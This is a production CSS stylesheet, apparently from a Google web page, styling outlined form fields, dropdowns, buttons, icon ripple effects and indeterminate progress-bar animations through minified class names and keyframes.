.A3sRAb .zHQkBf {
	-webkit-border-radius: 4px;
	border-radius: 4px;
	color: #202124;
	font-size: 16px;
	height: 28px;
	margin: 2px;
	padding: 12px 14px;
	z-index: 1
}

.A3sRAb.OcVpRe .zHQkBf {
	font-size: 14px;
	height: 20px;
	padding: 6px 10px
}

.A3sRAb.YKooDc .zHQkBf,
.A3sRAb.YKooDc .MQL3Ob {
	direction: ltr;
	text-align: left
}

.A3sRAb .iHd5yb {
	padding-left: 14px
}

.A3sRAb.OcVpRe .iHd5yb {
	padding-left: 10px
}

.A3sRAb .MQL3Ob {
	padding-right: 14px;
	z-index: 1
}

.A3sRAb.OcVpRe .MQL3Ob {
	padding-right: 10px
}

.A3sRAb .mIZh1c,
.A3sRAb .cXrdqd {
	-webkit-border-radius: 4px;
	border-radius: 4px;
	-webkit-box-sizing: border-box;
	box-sizing: border-box
}

.A3sRAb .mIZh1c,
.A3sRAb .cXrdqd,
.A3sRAb.IYewr .mIZh1c,
.A3sRAb.IYewr .cXrdqd {
	background-color: transparent;
	bottom: 0;
	height: auto;
	top: 16px
}

.A3sRAb .mIZh1c {
	border: 1px solid #dadce0;
	padding: 1px
}

.A3sRAb .cXrdqd {
	border: 2px solid #1a73e8;
	opacity: 0;
	-webkit-transform: none;
	transform: none;
	-webkit-transition: opacity .15s cubic-bezier(.4, 0, .2, 1);
	transition: opacity .15s cubic-bezier(.4, 0, .2, 1)
}

.A3sRAb.u3bW4e .cXrdqd {
	-webkit-animation: none;
	animation: none;
	opacity: 1
}

.A3sRAb.IYewr .cXrdqd {
	-webkit-animation: none;
	animation: none;
	opacity: 1;
	border-color: #d93025
}

.A3sRAb .RxsGPe,
.A3sRAb .Is7Fhb {
	display: none
}

.xgOPLd {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	font-size: 12px
}

.xgOPLd:empty,
.KNJZgf:empty {
	display: none
}

.Xk3mYe.Jj6Lae .xgOPLd {
	color: #d93025
}

.SD9c5 {
	display: none;
	margin-right: 8px
}

.SD9c5 svg {
	height: 16px;
	width: 16px
}

.Xk3mYe.Jj6Lae .SD9c5 {
	display: block
}

.Xk3mYe.ia6RDd .xgOPLd {
	margin-top: 16px
}

@media all and (min-width:601px) {
	.Xk3mYe.ia6RDd.DbQnIe .xgOPLd {
		margin-top: 0
	}
}

.KNJZgf a,
.KNJZgf button {
	font-family: 'Google Sans', 'Noto Sans Myanmar UI', arial, sans-serif
}

.GQ8Pzc {
	-webkit-align-items: flex-start;
	align-items: flex-start;
	color: #d93025;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	font-size: 12px;
	line-height: normal;
	margin-top: 2px
}

.TQGan {
	margin-right: 8px;
	margin-top: -2px
}

.TQGan svg {
	display: block;
	height: 16px;
	width: 16px
}

.G5XIyb {
	border: 0;
	object-fit: contain
}

.Rfj4Cf {
	direction: ltr
}

.Rfj4Cf .fQxwff .uIZQNc {
	padding-top: 16px
}

.Rfj4Cf:first-child .uIZQNc {
	padding-top: 8px
}

.Rfj4Cf .iHd5yb {
	padding-left: 0;
	padding-right: 12px
}

.Rfj4Cf.Rfj4Cf .zHQkBf {
	text-align: left
}

.Ylozk {
	font-size: 12px;
	margin: 0 8px
}

.Tnf3Hd {
	margin: 0 -8px
}

.Tnf3Hd .aCP0ld {
	min-height: 16px;
	padding: 0 8px
}

.Tnf3Hd .aCP0ld:empty {
	display: none
}

.TZwIke {
	-webkit-box-sizing: border-box;
	box-sizing: border-box;
	display: inline-block;
	padding: 0 8px;
	vertical-align: top;
	width: 33.333333333333333%
}

.TZwIke .OWO79c {
	margin-bottom: 0
}

.TZwIke .RxsGPe,
.TZwIke .gaDGub {
	min-height: 0;
	padding: 0
}

.VZCJke .TZwIke {
	width: 50%
}

.OWO79c {
	font-size: 16px;
	line-height: 28px;
	outline: none;
	padding: 16px 0;
	text-align: start
}

.OWO79c.OcVpRe {
	padding: 24px 0
}

.OWO79c:first-child {
	padding: 8px 0
}

.UpBc1d {
	position: relative
}

.GDWqpb {
	background: #fff;
	bottom: 18px;
	-webkit-box-sizing: border-box;
	box-sizing: border-box;
	left: 8px;
	padding: 0 8px;
	pointer-events: none;
	position: absolute;
	-webkit-transform-origin: left bottom;
	transform-origin: left bottom;
	z-index: 1
}

.OcVpRe .GDWqpb {
	bottom: 10px;
	left: 6px;
	padding: 0 6px
}

.HgKcKc {
	color: #80868b;
	display: block;
	font-size: 16px;
	line-height: normal;
	overflow: hidden;
	position: relative;
	white-space: nowrap
}

.OcVpRe .HgKcKc {
	color: #5f6368;
	font-size: 14px
}

.OcVpRe .XqM8Sd {
	-webkit-transform: scale(.75) translatey(-26px);
	transform: scale(.75) translatey(-26px)
}

.XqM8Sd {
	-webkit-transition: all .3s cubic-bezier(0.4, 0, 0.2, 1);
	transition: all .3s cubic-bezier(0.4, 0, 0.2, 1);
	-webkit-transform: scale(.75) translatey(-39px);
	transform: scale(.75) translatey(-39px)
}

.XqM8Sd .HgKcKc {
	overflow: visible
}

.Ng9rid .XqM8Sd .HgKcKc {
	color: #1a73e8
}

.kuVGcb {
	padding: 0;
	position: relative;
	top: 0
}

.N9rVke,
.N9rVke:active,
.N9rVke:focus {
	-webkit-appearance: none;
	appearance: none;
	background: none;
	border: none;
	color: #202124;
	font: inherit;
	height: 56px;
	line-height: 28px;
	outline: none;
	padding: 15px 24px 13px 16px;
	position: relative;
	resize: none;
	width: 100%;
	z-index: 1
}

.OcVpRe .N9rVke,
.OcVpRe .N9rVke:active,
.OcVpRe .N9rVke:focus {
	color: #5f6368;
	font-size: 14px;
	height: 36px;
	padding: 4px 24px 4px 12px
}

.Ng9rid.EIeTx .XqM8Sd .HgKcKc {
	color: #d93025
}

.N9rVke option:empty {
	display: none
}

.xri9ec {
	border-color: rgba(0, 0, 0, 0.38) transparent;
	border-style: solid;
	border-width: 6px 6px 0 6px;
	bottom: 23px;
	height: 0;
	pointer-events: none;
	position: absolute;
	right: 16px;
	width: 0;
	z-index: 1
}

.OcVpRe .xri9ec {
	bottom: 14px;
	right: 12px
}

.RuaZWe,
.GmvKtc {
	background: none;
	-webkit-border-radius: 4px;
	border-radius: 4px;
	-webkit-box-sizing: border-box;
	box-sizing: border-box;
	height: 100%
}

.RuaZWe {
	border: 1px solid #dadce0;
	bottom: 0;
	left: 0;
	position: absolute;
	right: 0
}

.Ng9rid .RuaZWe {
	border: 2px solid #1a73e8
}

.EIeTx .RuaZWe {
	border: 2px solid #d93025
}

.gaDGub {
	color: #d93025;
	display: block;
	font-size: 12px;
	padding-top: 4px;
	min-height: 16px
}

.tk3N6e-LgbsSe {
	-webkit-border-radius: 2px;
	border-radius: 2px;
	cursor: default;
	font-size: 11px;
	font-weight: bold;
	text-align: center;
	white-space: nowrap;
	margin-right: 16px;
	height: 27px;
	line-height: 27px;
	min-width: 54px;
	outline: 0;
	padding: 0 8px
}

.tk3N6e-LgbsSe-ZmdkE {
	-webkit-box-shadow: 0 1px 1px rgba(0, 0, 0, .1);
	box-shadow: 0 1px 1px rgba(0, 0, 0, .1)
}

.tk3N6e-LgbsSe-gk6SMd {
	-webkit-box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.1);
	box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.1)
}

.tk3N6e-LgbsSe.tk3N6e-LgbsSe-OWB6Me:active {
	-webkit-box-shadow: none;
	box-shadow: none
}

.tk3N6e-LgbsSe-n2to0e {
	-webkit-box-shadow: none;
	box-shadow: none
}

.tk3N6e-LgbsSe-n2to0e.tk3N6e-LgbsSe-ZmdkE,
.tk3N6e-LgbsSe-n2to0e.tk3N6e-LgbsSe-JbbQac-i5vt6e.tk3N6e-LgbsSe-ZmdkE {
	-webkit-box-shadow: none;
	box-shadow: none;
	color: #333
}

.tk3N6e-LgbsSe-n2to0e:active,
.tk3N6e-LgbsSe-n2to0e.tk3N6e-LgbsSe-ZmdkE:active {
	-webkit-box-shadow: inset 0 1px 2px rgba(0, 0, 0, .1);
	box-shadow: inset 0 1px 2px rgba(0, 0, 0, .1);
	background: #f8f8f8
}

.tk3N6e-LgbsSe-n2to0e.tk3N6e-LgbsSe-gk6SMd,
.tk3N6e-LgbsSe-n2to0e.tk3N6e-LgbsSe-JbbQac-i5vt6e.tk3N6e-LgbsSe-gk6SMd {
	background-color: #eee;
	background-image: -webkit-linear-gradient(top, #f8f8f8, #f1f1f1);
	background-image: linear-gradient(top, #f8f8f8, #f1f1f1);
	border: 1px solid #ccc;
	color: #333
}

.tk3N6e-LgbsSe-n2to0e.tk3N6e-LgbsSe-barxie,
.tk3N6e-LgbsSe-n2to0e.tk3N6e-LgbsSe-JbbQac-i5vt6e.tk3N6e-LgbsSe-barxie {
	-webkit-box-shadow: inset 0 1px 2px rgba(0, 0, 0, .1);
	box-shadow: inset 0 1px 2px rgba(0, 0, 0, .1);
	background-color: #eee;
	background-image: -webkit-linear-gradient(top, #eee, #e0e0e0);
	background-image: linear-gradient(top, #eee, #e0e0e0);
	border: 1px solid #ccc;
	color: #333
}

.tk3N6e-LgbsSe-n2to0e:focus {
	outline: none
}

.tk3N6e-LgbsSe-n2to0e.tk3N6e-LgbsSe-JbbQac-i5vt6e {
	outline: none
}

.tk3N6e-LgbsSe-n2to0e.tk3N6e-LgbsSe-OWB6Me {
	background: #fff;
	border: 1px solid #f3f3f3;
	border: 1px solid rgba(0, 0, 0, 0.05);
	color: #b8b8b8
}

.tk3N6e-LgbsSe-n2to0e {
	background: none;
	border: 0;
	-webkit-box-shadow: none;
	box-shadow: none;
	color: #4285f4;
	cursor: pointer;
	display: inline-block;
	font-size: 14px;
	font-weight: 500;
	float: right;
	margin: 0;
	padding: 6px 13px;
	text-transform: uppercase
}

.tk3N6e-LgbsSe-n2to0e:active,
.tk3N6e-LgbsSe-n2to0e.tk3N6e-LgbsSe-ZmdkE:active,
.tk3N6e-LgbsSe-n2to0e:focus,
.tk3N6e-LgbsSe-n2to0e.tk3N6e-LgbsSe-ZmdkE:focus {
	-webkit-box-shadow: none;
	box-shadow: none;
	background-color: rgba(51, 103, 214, 0.12);
	border: 0;
	color: #4285f4
}

.tk3N6e-LgbsSe-n2to0e.tk3N6e-LgbsSe-JbbQac-i5vt6e,
.tk3N6e-LgbsSe-n2to0e.tk3N6e-LgbsSe-ZmdkE,
.tk3N6e-LgbsSe-n2to0e.tk3N6e-LgbsSe-JbbQac-i5vt6e.tk3N6e-LgbsSe-ZmdkE {
	background: transparent;
	border: 0
}

.pvRjpc,
.pvRjpc:active {
	color: #4285f4
}

.ziTGE {
	display: none
}

.iGLbyd>.OWO79c:first-child,
.QC1ICf>:first-child .uIZQNc {
	padding-top: 16px
}

.OcVpRe .OWO79c,
.OcVpRe .uIZQNc {
	padding-top: 24px
}

.iGLbyd:first-child .OWO79c:first-child {
	padding-top: 8px
}

.jQ9OEf.jQ9OEf {
	-webkit-box-sizing: content-box;
	box-sizing: content-box
}

.jQ9OEf .rFrNMe {
	padding: 16px 0 8px
}

.jQ9OEf.OcVpRe .rFrNMe {
	padding: 24px 0 8px
}

.jQ9OEf:first-child .rFrNMe {
	padding: 8px 0 8px
}

.jQ9OEf .rFrNMe .oJeWuf.oJeWuf {
	height: 56px;
	padding-top: 0
}

.jQ9OEf.OcVpRe .rFrNMe .oJeWuf.oJeWuf {
	height: 36px
}

.jQ9OEf .Wic03c {
	-webkit-align-items: center;
	align-items: center;
	position: static;
	top: 0
}

.jQ9OEf .zHQkBf {
	-webkit-border-radius: 4px;
	border-radius: 4px;
	height: 28px;
	margin: 1px 1px 0 1px;
	padding: 13px 15px;
	z-index: 1
}

.jQ9OEf .u3bW4e .zHQkBf,
.jQ9OEf .k0tWj .zHQkBf {
	margin: 2px 2px 0 2px;
	padding: 12px 14px
}

.jQ9OEf.OcVpRe .zHQkBf {
	font-size: 14px;
	height: 20px;
	padding: 7px 11px
}

.jQ9OEf.OcVpRe .u3bW4e .zHQkBf,
.jQ9OEf.OcVpRe .k0tWj .zHQkBf {
	height: 20px;
	padding: 6px 10px
}

.jQ9OEf .snByac {
	background: #fff;
	bottom: 17px;
	-webkit-box-sizing: border-box;
	box-sizing: border-box;
	color: #80868b;
	left: 8px;
	padding: 0 8px;
	-webkit-transition: transform 150ms cubic-bezier(0.4, 0, 0.2, 1), opacity 150ms cubic-bezier(0.4, 0, 0.2, 1);
	transition: transform 150ms cubic-bezier(0.4, 0, 0.2, 1), opacity 150ms cubic-bezier(0.4, 0, 0.2, 1);
	width: auto;
	z-index: 1
}

.jQ9OEf.OcVpRe .snByac {
	bottom: 9px;
	color: #5f6368;
	font-size: 14px;
	left: 4px;
	padding: 0 6px
}

.jQ9OEf.OcVpRe .u3bW4e .snByac,
.jQ9OEf.OcVpRe .CDELXb .snByac {
	-webkit-transform: scale(.75) translateY(-155%);
	transform: scale(.75) translateY(-155%)
}

.jQ9OEf .iHd5yb {
	padding-left: 15px
}

.jQ9OEf .u3bW4e .iHd5yb {
	padding-left: 14px
}

.jQ9OEf.OcVpRe .iHd5yb {
	padding-left: 11px
}

.jQ9OEf.OcVpRe .u3bW4e .iHd5yb {
	padding-left: 10px
}

.jQ9OEf .MQL3Ob {
	padding-right: 15px
}

.jQ9OEf .u3bW4e .MQL3Ob {
	padding-right: 14px
}

.jQ9OEf.OcVpRe .MQL3Ob {
	padding-right: 11px
}

.jQ9OEf.OcVpRe .u3bW4e .MQL3Ob {
	padding-right: 10px
}

.jQ9OEf .zHQkBf {
	text-align: left
}

.jQ9OEf .Is7Fhb {
	opacity: 1;
	padding-top: 8px
}

.jQ9OEf .RxsGPe:empty {
	-webkit-flex: none;
	flex: none;
	min-height: 0;
	padding-top: 0
}

.jQ9OEf .mIZh1c {
	border: 1px solid #dadce0;
	-webkit-border-radius: 4px;
	border-radius: 4px;
	bottom: 0;
	-webkit-box-sizing: border-box;
	box-sizing: border-box
}

.jQ9OEf .cXrdqd {
	-webkit-border-radius: 4px;
	border-radius: 4px;
	bottom: 0;
	opacity: 0;
	-webkit-transform: none;
	transform: none;
	-webkit-transition: opacity 150ms cubic-bezier(0.4, 0, 0.2, 1);
	transition: opacity 150ms cubic-bezier(0.4, 0, 0.2, 1);
	width: -webkit-calc(100% - 2*2px);
	width: calc(100% - 2*2px)
}

.jQ9OEf .mIZh1c,
.jQ9OEf .cXrdqd,
.jQ9OEf .k0tWj .mIZh1c,
.jQ9OEf .k0tWj .cXrdqd {
	background-color: transparent
}

.jQ9OEf .mIZh1c,
.jQ9OEf .k0tWj .mIZh1c {
	height: 100%
}

.jQ9OEf .cXrdqd,
.jQ9OEf .k0tWj .cXrdqd {
	height: -webkit-calc(100% - 2*2px);
	height: calc(100% - 2*2px)
}

.jQ9OEf .u3bW4e .cXrdqd,
.jQ9OEf .k0tWj .cXrdqd {
	-webkit-animation: none;
	animation: none;
	opacity: 1
}

.jQ9OEf .u3bW4e .cXrdqd {
	border: 2px solid #1a73e8
}

.jQ9OEf .k0tWj .cXrdqd {
	border: 2px solid #d93025
}

.Ayj6Sc {
	margin-bottom: 5px
}

.a7dCGb,
.ll4rnc {
	color: rgba(0, 0, 0, 0.65)
}

.yAo8Ce {
	display: none
}

.fZA7Dc>.P7gl3b {
	width: 100%
}

.sudp7e {
	width: 100%;
	margin-top: 5px
}

.aGTPBb.mUbCce {
	height: 24px;
	top: -3px;
	width: 24px
}

.uGNEjc {
	display: inline-block;
	height: 24px;
	width: 24px;
	vertical-align: middle
}

.AMUKEc {
	fill: rgba(0, 0, 0, 0.65)
}

.fZA7Dc .EHDnW,
.fZA7Dc.eO2Zfd .JZ5lZc {
	display: none
}

.fZA7Dc.eO2Zfd .EHDnW {
	display: inline-block
}

.NMm5M {
	fill: currentColor;
	-webkit-flex-shrink: 0;
	flex-shrink: 0
}

.mUbCce {
	-webkit-user-select: none;
	-webkit-transition: background .3s;
	transition: background .3s;
	border: 0;
	-webkit-border-radius: 50%;
	border-radius: 50%;
	cursor: pointer;
	display: inline-block;
	-webkit-flex-shrink: 0;
	flex-shrink: 0;
	height: 48px;
	outline: none;
	overflow: hidden;
	position: relative;
	text-align: center;
	-webkit-tap-highlight-color: transparent;
	width: 48px;
	z-index: 0
}

.mUbCce>.TpQm9d {
	height: 48px;
	width: 48px
}

.mUbCce.u3bW4e,
.mUbCce.qs41qe,
.mUbCce.j7nIZb {
	-webkit-transform: translateZ(0);
	-webkit-mask-image: -webkit-radial-gradient(circle, white 100%, black 100%)
}

.YYBxpf {
	-webkit-border-radius: 0;
	border-radius: 0;
	overflow: visible
}

.YYBxpf.u3bW4e,
.YYBxpf.qs41qe,
.YYBxpf.j7nIZb {
	-webkit-mask-image: none
}

.fKz7Od {
	color: rgba(0, 0, 0, 0.54);
	fill: rgba(0, 0, 0, 0.54)
}

.p9Nwte {
	color: rgba(255, 255, 255, 0.749);
	fill: rgba(255, 255, 255, 0.749)
}

.fKz7Od.u3bW4e {
	background-color: rgba(0, 0, 0, 0.12)
}

.p9Nwte.u3bW4e {
	background-color: rgba(204, 204, 204, 0.251)
}

.YYBxpf.u3bW4e {
	background-color: transparent
}

.VTBa7b {
	-webkit-transform: translate(-50%, -50%) scale(0);
	transform: translate(-50%, -50%) scale(0);
	-webkit-transition: opacity .2s ease, visibility 0s ease .2s, transform 0s ease .2s;
	transition: opacity .2s ease, visibility 0s ease .2s, transform 0s ease .2s;
	-webkit-transition: opacity .2s ease, visibility 0s ease .2s, -webkit-transform 0s ease .2s;
	transition: opacity .2s ease, visibility 0s ease .2s, -webkit-transform 0s ease .2s;
	-webkit-background-size: cover;
	background-size: cover;
	left: 0;
	opacity: 0;
	pointer-events: none;
	position: absolute;
	top: 0;
	visibility: hidden
}

.YYBxpf.u3bW4e .VTBa7b {
	-webkit-animation: quantumWizIconFocusPulse .7s infinite alternate;
	animation: quantumWizIconFocusPulse .7s infinite alternate;
	height: 100%;
	left: 50%;
	top: 50%;
	width: 100%;
	visibility: visible
}

.mUbCce.qs41qe .VTBa7b {
	-webkit-transform: translate(-50%, -50%) scale(2.2);
	transform: translate(-50%, -50%) scale(2.2);
	opacity: 1;
	visibility: visible
}

.mUbCce.qs41qe.M9Bg4d .VTBa7b {
	-webkit-transition: -webkit-transform .3s cubic-bezier(0.0, 0.0, 0.2, 1), opacity .2s cubic-bezier(0.0, 0.0, 0.2, 1);
	transition: -webkit-transform .3s cubic-bezier(0.0, 0.0, 0.2, 1), opacity .2s cubic-bezier(0.0, 0.0, 0.2, 1);
	-webkit-transition: transform .3s cubic-bezier(0.0, 0.0, 0.2, 1), opacity .2s cubic-bezier(0.0, 0.0, 0.2, 1);
	transition: transform .3s cubic-bezier(0.0, 0.0, 0.2, 1), opacity .2s cubic-bezier(0.0, 0.0, 0.2, 1)
}

.mUbCce.j7nIZb .VTBa7b {
	-webkit-transform: translate(-50%, -50%) scale(2.2);
	transform: translate(-50%, -50%) scale(2.2);
	visibility: visible
}

.fKz7Od .VTBa7b {
	background-image: radial-gradient(circle farthest-side, rgba(0, 0, 0, 0.12), rgba(0, 0, 0, 0.12) 80%, rgba(0, 0, 0, 0) 100%)
}

.p9Nwte .VTBa7b {
	background-image: radial-gradient(circle farthest-side, rgba(204, 204, 204, 0.251), rgba(204, 204, 204, 0.251) 80%, rgba(204, 204, 204, 0) 100%)
}

.mUbCce.RDPZE {
	color: rgba(0, 0, 0, 0.26);
	fill: rgba(0, 0, 0, 0.26);
	cursor: default
}

.p9Nwte.RDPZE {
	color: rgba(255, 255, 255, 0.502);
	fill: rgba(255, 255, 255, 0.502)
}

.xjKiLb {
	position: relative;
	top: 50%
}

.xjKiLb>span {
	display: inline-block;
	position: relative
}

.QMeRGf:after {
	clear: both;
	content: "";
	display: table
}

.Iwx7Cd {
	float: left;
	line-height: 24px;
	margin: 0 16px 0 0;
	width: 56px
}

.TZHY7d:before {
	top: -22px
}

.TZHY7d .e2CuFe {
	top: 10px
}

.TZHY7d .ry3kXd .KKjvXb {
	padding-bottom: 2px;
	padding-top: 0
}

.gRE7xb {
	margin-left: 72px
}

@keyframes primary-indeterminate-translate {
	0% {
		-webkit-transform: translateX(-145.166611%);
		transform: translateX(-145.166611%)
	}
	20% {
		-webkit-animation-timing-function: cubic-bezier(.5, 0, .701732, .495819);
		animation-timing-function: cubic-bezier(.5, 0, .701732, .495819);
		-webkit-transform: translateX(-145.166611%);
		transform: translateX(-145.166611%)
	}
	59.15% {
		-webkit-animation-timing-function: cubic-bezier(.302435, .381352, .55, .956352);
		animation-timing-function: cubic-bezier(.302435, .381352, .55, .956352);
		-webkit-transform: translateX(-61.495191%);
		transform: translateX(-61.495191%)
	}
	to {
		-webkit-transform: translateX(55.444446%);
		transform: translateX(55.444446%)
	}
}

@-webkit-keyframes primary-indeterminate-translate {
	0% {
		-webkit-transform: translateX(-145.166611%);
		transform: translateX(-145.166611%)
	}
	20% {
		-webkit-animation-timing-function: cubic-bezier(.5, 0, .701732, .495819);
		animation-timing-function: cubic-bezier(.5, 0, .701732, .495819);
		-webkit-transform: translateX(-145.166611%);
		transform: translateX(-145.166611%)
	}
	59.15% {
		-webkit-animation-timing-function: cubic-bezier(.302435, .381352, .55, .956352);
		animation-timing-function: cubic-bezier(.302435, .381352, .55, .956352);
		-webkit-transform: translateX(-61.495191%);
		transform: translateX(-61.495191%)
	}
	to {
		-webkit-transform: translateX(55.444446%);
		transform: translateX(55.444446%)
	}
}

@keyframes primary-indeterminate-translate-reverse {
	0% {
		-webkit-transform: translateX(145.166611%);
		transform: translateX(145.166611%)
	}
	20% {
		-webkit-animation-timing-function: cubic-bezier(.5, 0, .701732, .495819);
		animation-timing-function: cubic-bezier(.5, 0, .701732, .495819);
		-webkit-transform: translateX(145.166611%);
		transform: translateX(145.166611%)
	}
	59.15% {
		-webkit-animation-timing-function: cubic-bezier(.302435, .381352, .55, .956352);
		animation-timing-function: cubic-bezier(.302435, .381352, .55, .956352);
		-webkit-transform: translateX(61.495191%);
		transform: translateX(61.495191%)
	}
	to {
		-webkit-transform: translateX(-55.4444461%);
		transform: translateX(-55.4444461%)
	}
}

@-webkit-keyframes primary-indeterminate-translate-reverse {
	0% {
		-webkit-transform: translateX(145.166611%);
		transform: translateX(145.166611%)
	}
	20% {
		-webkit-animation-timing-function: cubic-bezier(.5, 0, .701732, .495819);
		animation-timing-function: cubic-bezier(.5, 0, .701732, .495819);
		-webkit-transform: translateX(145.166611%);
		transform: translateX(145.166611%)
	}
	59.15% {
		-webkit-animation-timing-function: cubic-bezier(.302435, .381352, .55, .956352);
		animation-timing-function: cubic-bezier(.302435, .381352, .55, .956352);
		-webkit-transform: translateX(61.495191%);
		transform: translateX(61.495191%)
	}
	to {
		-webkit-transform: translateX(-55.4444461%);
		transform: translateX(-55.4444461%)
	}
}

@keyframes primary-indeterminate-scale {
	0% {
		-webkit-transform: scaleX(.08);
		transform: scaleX(.08)
	}
	36.65% {
		-webkit-animation-timing-function: cubic-bezier(.334731, .124820, .785844, 1);
		animation-timing-function: cubic-bezier(.334731, .124820, .785844, 1);
		-webkit-transform: scaleX(.08);
		transform: scaleX(.08)
	}
	69.15% {
		-webkit-animation-timing-function: cubic-bezier(.06, .11, .6, 1);
		animation-timing-function: cubic-bezier(.06, .11, .6, 1);
		-webkit-transform: scaleX(.661479);
		transform: scaleX(.661479)
	}
	to {
		-webkit-transform: scaleX(.08);
		transform: scaleX(.08)
	}
}

@-webkit-keyframes primary-indeterminate-scale {
	0% {
		-webkit-transform: scaleX(.08);
		transform: scaleX(.08)
	}
	36.65% {
		-webkit-animation-timing-function: cubic-bezier(.334731, .124820, .785844, 1);
		animation-timing-function: cubic-bezier(.334731, .124820, .785844, 1);
		-webkit-transform: scaleX(.08);
		transform: scaleX(.08)
	}
	69.15% {
		-webkit-animation-timing-function: cubic-bezier(.06, .11, .6, 1);
		animation-timing-function: cubic-bezier(.06, .11, .6, 1);
		-webkit-transform: scaleX(.661479);
		transform: scaleX(.661479)
	}
	to {
		-webkit-transform: scaleX(.08);
		transform: scaleX(.08)
	}
}

@keyframes auxiliary-indeterminate-translate {
	0% {
		-webkit-animation-timing-function: cubic-bezier(.15, 0, .515058, .409685);
		animation-timing-function: cubic-bezier(.15, 0, .515058, .409685);
		-webkit-transform: translateX(-54.888891%);
		transform: translateX(-54.888891%)
	}
	25% {
		-webkit-animation-timing-function: cubic-bezier(.310330, .284058, .8, .733712);
		animation-timing-function: cubic-bezier(.310330, .284058, .8, .733712);
		-webkit-transform: translateX(-17.236978%);
		transform: translateX(-17.236978%)
	}
	48.35% {
		-webkit-animation-timing-function: cubic-bezier(.4, .627035, .6, .902026);
		animation-timing-function: cubic-bezier(.4, .627035, .6, .902026);
		-webkit-transform: translateX(29.497274%);
		transform: translateX(29.497274%)
	}
	to {
		-webkit-transform: translateX(105.388891%);
		transform: translateX(105.388891%)
	}
}

@-webkit-keyframes auxiliary-indeterminate-translate {
	0% {
		-webkit-animation-timing-function: cubic-bezier(.15, 0, .515058, .409685);
		animation-timing-function: cubic-bezier(.15, 0, .515058, .409685);
		-webkit-transform: translateX(-54.888891%);
		transform: translateX(-54.888891%)
	}
	25% {
		-webkit-animation-timing-function: cubic-bezier(.310330, .284058, .8, .733712);
		animation-timing-function: cubic-bezier(.310330, .284058, .8, .733712);
		-webkit-transform: translateX(-17.236978%);
		transform: translateX(-17.236978%)
	}
	48.35% {
		-webkit-animation-timing-function: cubic-bezier(.4, .627035, .6, .902026);
		animation-timing-function: cubic-bezier(.4, .627035, .6, .902026);
		-webkit-transform: translateX(29.497274%);
		transform: translateX(29.497274%)
	}
	to {
		-webkit-transform: translateX(105.388891%);
		transform: translateX(105.388891%)
	}
}

@keyframes auxiliary-indeterminate-translate-reverse {
	0% {
		-webkit-animation-timing-function: cubic-bezier(.15, 0, .515058, .409685);
		animation-timing-function: cubic-bezier(.15, 0, .515058, .409685);
		-webkit-transform: translateX(54.888891%);
		transform: translateX(54.888891%)
	}
	25% {
		-webkit-animation-timing-function: cubic-bezier(.310330, .284058, .8, .733712);
		animation-timing-function: cubic-bezier(.310330, .284058, .8, .733712);
		-webkit-transform: translateX(17.236978%);
		transform: translateX(17.236978%)
	}
	48.35% {
		-webkit-animation-timing-function: cubic-bezier(.4, .627035, .6, .902026);
		animation-timing-function: cubic-bezier(.4, .627035, .6, .902026);
		-webkit-transform: translateX(-29.497274%);
		transform: translateX(-29.497274%)
	}
	to {
		-webkit-transform: translateX(-105.388891%);
		transform: translateX(-105.388891%)
	}
}

@-webkit-keyframes auxiliary-indeterminate-translate-reverse {
	0% {
		-webkit-animation-timing-function: cubic-bezier(.15, 0, .515058, .409685);
		animation-timing-function: cubic-bezier(.15, 0, .515058, .409685);
		-webkit-transform: translateX(54.888891%);
		transform: translateX(54.888891%)
	}
	25% {
		-webkit-animation-timing-function: cubic-bezier(.310330, .284058, .8, .733712);
		animation-timing-function: cubic-bezier(.310330, .284058, .8, .733712);
		-webkit-transform: translateX(17.236978%);
		transform: translateX(17.236978%)
	}
	48.35% {
		-webkit-animation-timing-function: cubic-bezier(.4, .627035, .6, .902026);
		animation-timing-function: cubic-bezier(.4, .627035, .6, .902026);
		-webkit-transform: translateX(-29.497274%);
		transform: translateX(-29.497274%)
	}
	to {
		-webkit-transform: translateX(-105.388891%);
		transform: translateX(-105.388891%)
	}
}

@keyframes auxiliary-indeterminate-scale {
	0% {
		-webkit-animation-timing-function: cubic-bezier(.205028, .057051, .576610, .453971);
		animation-timing-function: cubic-bezier(.205028, .057051, .576610, .453971);
		-webkit-transform: scaleX(.08);
		transform: scaleX(.08)
	}
	19.15% {
		-webkit-animation-timing-function: cubic-bezier(.152313, .196432, .648374, 1.004315);
		animation-timing-function: cubic-bezier(.152313, .196432, .648374, 1.004315);
		-webkit-transform: scaleX(.457104);
		transform: scaleX(.457104)
	}
	44.15% {
		-webkit-animation-timing-function: cubic-bezier(.257759, .003163, .211762, 1.381790);
		animation-timing-function: cubic-bezier(.257759, .003163, .211762, 1.381790);
		-webkit-transform: scaleX(.727960);
		transform: scaleX(.727960)
	}
	to {
		-webkit-transform: scaleX(.08);
		transform: scaleX(.08)
	}
}

@-webkit-keyframes auxiliary-indeterminate-scale {
	0% {
		-webkit-animation-timing-function: cubic-bezier(.205028, .057051, .576610, .453971);
		animation-timing-function: cubic-bezier(.205028, .057051, .576610, .453971);
		-webkit-transform: scaleX(.08);
		transform: scaleX(.08)
	}
	19.15% {
		-webkit-animation-timing-function: cubic-bezier(.152313, .196432, .648374, 1.004315);
		animation-timing-function: cubic-bezier(.152313, .196432, .648374, 1.004315);
		-webkit-transform: scaleX(.457104);
		transform: scaleX(.457104)
	}
	44.15% {
		-webkit-animation-timing-function: cubic-bezier(.257759, .003163, .211762, 1.381790);
		animation-timing-function: cubic-bezier(.257759, .003163, .211762, 1.381790);
		-webkit-transform: scaleX(.727960);
		transform: scaleX(.727960)
	}
	to {
		-webkit-transform: scaleX(.08);
		transform: scaleX(.08)
	}
}

@keyframes buffering {
	to {
		-webkit-transform: translateX(-10px);
		transform: translateX(-10px)
	}
}

@-webkit-keyframes buffering {
	to {
		-webkit-transform: translateX(-10px);
		transform: translateX(-10px)
	}
}

@keyframes buffering-reverse {
	to {
		-webkit-transform: translateX(10px);
		transform: translateX(10px)
	}
}

@-webkit-keyframes buffering-reverse {
	to {
		-webkit-transform: translateX(10px);
		transform: translateX(10px)
	}
}

@keyframes indeterminate-translate-ie {
	0% {
		-webkit-transform: translateX(-100%);
		transform: translateX(-100%)
	}
	to {
		-webkit-transform: translateX(100%);
		transform: translateX(100%)
	}
}

@keyframes indeterminate-translate-reverse-ie {
	0% {
		-webkit-transform: translateX(100%);
		transform: translateX(100%)
	}
	to {
		-webkit-transform: translateX(-100%);
		transform: translateX(-100%)
	}
}

